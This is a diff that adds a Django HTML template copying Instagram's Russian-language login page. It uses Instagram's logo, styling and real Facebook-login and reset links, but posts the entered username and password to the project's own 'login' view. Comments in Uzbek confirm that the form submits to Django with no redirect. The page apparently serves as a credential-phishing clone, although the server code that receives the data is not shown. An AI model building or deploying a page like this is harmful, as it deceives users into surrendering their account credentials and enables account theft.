@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        :root {
+            --ig-blue: #0095f6;
+            --ig-blue-hover: #007acc;
+            --ig-blue-disabled: #b2dffc;
+            --ig-facebook: #385185;
+            --ig-text: #262626;
+            --ig-text-light: #8e8e8e;
+            --ig-border: #dbdbdb;
+            --ig-bg: #fafafa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        html, body {
+            height: 100%;
+            width: 100%;
+            background: white;
+            color: var(--ig-text);
+            overflow-x: hidden;
+            -webkit-text-size-adjust: 100%;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0;
+            background: white;
+        }
+
+        /* Header */
+        .header {
+            width: 100%;
+            padding: 50px 0 30px 0;
+            text-align: center;
+        }
+
+        /* Instagram logo */
+        .instagram-logo {
+            background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png');
+            background-position: 0px -2907px;
+            background-size: auto;
+            width: 175px;
+            height: 51px;
+            background-repeat: no-repeat;
+            display: inline-block;
+            filter: brightness(0) saturate(100%);
+            margin: 0 auto;
+        }
+
+        /* Main Content */
+        .main-content {
+            width: 100%;
+            max-width: 350px;
+            padding: 0 40px;
+        }
+
+        /* Form Container */
+        .form-container {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        /* Input Fields */
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 9px 8px 7px 8px;
+            background: var(--ig-bg);
+            border: 1px solid var(--ig-border);
+            border-radius: 3px;
+            font-size: 12px;
+            color: var(--ig-text);
+            outline: none;
+            height: 36px;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        .input-field::placeholder {
+            color: var(--ig-text-light);
+            font-size: 12px;
+        }
+
+        /* Login Button */
+        .login-btn {
+            width: 100%;
+            padding: 7px;
+            background: var(--ig-blue-disabled);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 14px;
+            height: 32px;
+        }
+
+        .login-btn.active {
+            background: var(--ig-blue);
+            cursor: pointer;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: var(--ig-text-light);
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: var(--ig-border);
+        }
+
+        .divider-text {
+            margin: 0 18px;
+            white-space: nowrap;
+            font-weight: 600;
+            color: #8e8e8e;
+        }
+
+        /* Facebook Login */
+        .fb-login-btn {
+            width: 100%;
+            background: none;
+            border: none;
+            color: var(--ig-facebook);
+            font-size: 14px;
+            font-weight: 600;
+            padding: 0;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 22px;
+            text-decoration: none;
+        }
+
+        .fb-login-btn i {
+            font-size: 18px;
+        }
+
+        /* Forgot Password */
+        .forgot-link {
+            display: block;
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            text-align: center;
+            margin-top: 12px;
+        }
+
+        /* Signup Section */
+        .signup-section {
+            width: 100%;
+            max-width: 350px;
+            padding: 25px 40px;
+            text-align: center;
+            font-size: 14px;
+            border-top: 1px solid var(--ig-border);
+            margin-top: 10px;
+        }
+
+        .signup-link {
+            color: var(--ig-blue);
+            font-weight: 600;
+            text-decoration: none;
+            margin-left: 4px;
+        }
+
+        /* Loading Animation */
+        .loader {
+            display: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 450px) {
+            body {
+                padding: 0;
+                justify-content: flex-start;
+                padding-top: 60px;
+            }
+            
+            .header {
+                padding: 20px 0 30px 0;
+                margin-bottom: 0;
+            }
+            
+            .main-content {
+                padding: 0 32px;
+            }
+            
+            .signup-section {
+                padding: 25px 32px;
+            }
+            
+            .instagram-logo {
+                width: 175px;
+                height: 55px;
+            }
+        }
+
+        @media (max-width: 320px) {
+            .main-content, .signup-section {
+                padding: 0 20px;
+            }
+            
+            .instagram-logo {
+                width: 150px;
+                height: 44px;
+            }
+            
+            .divider-text {
+                margin: 0 12px;
+                font-size: 12px;
+            }
+        }
+
+        /* Show Password Button */
+        .show-password {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--ig-text-light);
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="instagram-logo"></div>
+    </div>
+    
+    <div class="main-content">
+        <div class="form-container">
+            <form id="loginForm" method="post"  action="{% url 'login' %}">
+                {% csrf_token %}
+                
+                <div class="input-group">
+                    <input type="text" 
+                           class="input-field" 
+                           id="username" 
+                           name="username"
+                           placeholder="Телефон, имя пользователя или эл. адрес"
+                           required
+                           autocomplete="username">
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" 
+                           class="input-field" 
+                           id="password" 
+                           name="password"
+                           placeholder="Пароль"
+                           required
+                           autocomplete="current-password">
+                    <button type="button" class="show-password" id="togglePassword">
+                        Показать
+                    </button>
+                </div>
+                
+                <button type="submit" class="login-btn" id="loginBtn" disabled>
+                    <span id="loginText">Войти</span>
+                    <div class="loader" id="loader"></div>
+                </button>
+            </form>
+            
+            <div class="divider">
+                <div class="divider-line"></div>
+                <div class="divider-text">ИЛИ</div>
+                <div class="divider-line"></div>
+            </div>
+            
+            <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATn7ao8WHJPNcGc2KbqakqbTc-gdYagYDScO8bqJZCID3_DGCvJPCCOOQ5ti6kLpp1plr75hr2V7QZL4nyYglAURMphXcHePUOjaJOnq8q180tO7AXIs_F0lneWUyjcJseH3hIqe-NjZC2PRoqja4_t5nY9_eDPhIvjG7fs0u51e5n99iGfYmPWpk1-OseeMpUPvFFZq4U7sjn26A_RzjfFR8EB6m_YUa7wGmUDRoYX75mJAT--YXMo68xWzSPfQUwu3" class="fb-login-btn" id="facebookLogin">
+                <i class="fab fa-facebook-square"></i>
+                <span>Войти через Facebook</span>
+            </a>
+            
+            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link" id="forgotPassword">
+                Забыли пароль?
+            </a>
+        </div>
+    </div>
+    
+    <div class="signup-section">
+        <span>У вас нет аккаунта?</span>
+        <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link" id="signupLink">Зарегистрироваться</a>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function () {
+
+        const form = document.getElementById('loginForm');
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const toggleBtn = document.getElementById('togglePassword');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginText = document.getElementById('loginText');
+        const loader = document.getElementById('loader');
+
+        // Show / hide password
+        toggleBtn.addEventListener('click', function () {
+            const type = password.type === 'password' ? 'text' : 'password';
+            password.type = type;
+            this.textContent = type === 'password' ? 'Показать' : 'Скрыть';
+        });
+
+        // Button active / inactive
+        function updateLoginButton() {
+            const filled = username.value.trim() && password.value.trim();
+            loginBtn.disabled = !filled;
+            loginBtn.classList.toggle('active', filled);
+        }
+
+        username.addEventListener('input', updateLoginButton);
+        password.addEventListener('input', updateLoginButton);
+
+        // ✅ DJANGO POST QILADI
+        form.addEventListener('submit', function () {
+            loginText.style.display = 'none';
+            loader.style.display = 'block';
+            loginBtn.disabled = true;
+            loginBtn.classList.remove('active');
+
+            // ❌ preventDefault YO‘Q
+            // ❌ redirect YO‘Q
+            // ✅ Django views ishlaydi
+        });
+
+    updateLoginButton();
+});
+</script>
+
+</body>
+</html>
